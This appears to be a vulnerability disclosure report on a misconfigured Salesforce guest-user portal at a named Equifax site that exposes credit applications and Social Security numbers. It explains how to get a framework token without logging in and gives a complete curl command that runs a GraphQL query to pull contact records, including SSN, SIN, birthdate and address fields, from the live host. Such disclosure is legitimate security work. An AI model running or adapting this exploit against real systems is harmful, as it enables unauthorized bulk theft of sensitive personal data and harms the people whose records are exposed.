title: PII Exposure of Credit Applications and Social Security Numbers equifax-6070.my.salesforce-sites.com (Salesforce guest user)
vulnerability_information:
Summary
-------
Equifax has a salesforce portal https://equifax-6070.my.salesforce-sites.com. It is leaking tens of thousands of credit reports.
You can access each of these objects but there isnt enough space to c/p all of the request and response headers in this report. So i have left it with what i consider the more serious ones, please check each object.
The equifax-6070 portal at https://equifax-6070.my.salesforce-sites.com is built on Salesforce Experience Cloud (Aura). Its Salesforce Guest User profile, together with the org-wide sharing defaults, grants an unauthenticated visitor object-level Read on the Contact, Account, Note, forseva1__DnBCustomReport__c, forseva1__ReportResponseData__c, forseva1__EquifaxBusinessPrincipalReport__c, forseva1__ReportResponse__c, Online_Credit_Application__c, forseva1__DnBDecisionSupport__c object(s). An anonymous user (no login, no account) can query the Salesforce UI API (GraphQL) through the Aura endpoint and read the records in bulk. No authentication is used: the request sends aura.token as the literal string "null".

How to reproduce
----------------
All steps are unauthenticated (aura.token=null). The Aura framework needs a current framework token (fwuid) and the community markup id (loaded). The fwuid is obtained without scraping the page by sending fwuid="INVALID"; the server returns the current valid fwuid in the response "context" object. The loaded id "x" is accepted by this org. The fwuid rotates per Salesforce release; if a request returns a "framework out of date" error, repeat step 1 to refresh it.

As a single self-contained command, the following curl reads 5 real records from the Contact object (no login). The fwuid and loaded values are current at the time of writing; if it returns a "framework out of date" error, refresh them as in step 1:
```
curl -sk --compressed 'https://equifax-6070.my.salesforce-sites.com/sfsites/aura' \
  --data-urlencode 'message={"actions": [{"id": "1;a", "descriptor": "aura://RecordUiController/ACTION$executeGraphQL", "callingDescriptor": "UNKNOWN", "params": {"queryInput": {"operationName": "r", "query": "query r{uiapi{query{Contact(first:5, orderBy:{CreatedDate:{order:DESC}}){totalCount edges{node{Id Name{value} FirstName{value} LastName{value} Email{value} Phone{value} MobilePhone{value} MailingStreet{value} MailingCity{value} MailingState{value} MailingPostalCode{value} Birthdate{value} AssistantName{value} AssistantPhone{value} Civic__c{value} Fax{value} HomePhone{value} MailingCountry{value} MailingGeocodeAccuracy{value} MailingLatitude{value} MailingLongitude{value} OtherCity{value} OtherPhone{value} OtherPostalCode{value} OtherState{value} OtherStreet{value} SIN__c{value} SSN__c{value} Street_Name__c{value} }}}}}}", "variables": {}}}}]}' \
  --data-urlencode 'aura.context={"mode": "PROD", "fwuid": "cmpKNldRZXRSMkdjemxQdjBkbl9uQWtVMjdnTGFERUU2S3FfSVdrcU92bkExNC4xOTIuODM4ODYwOA", "app": "siteforce:communityApp", "loaded": {"APPLICATION@markup://siteforce:communityApp": "x"}, "dn": [], "globals": {}, "uad": false}' \
```
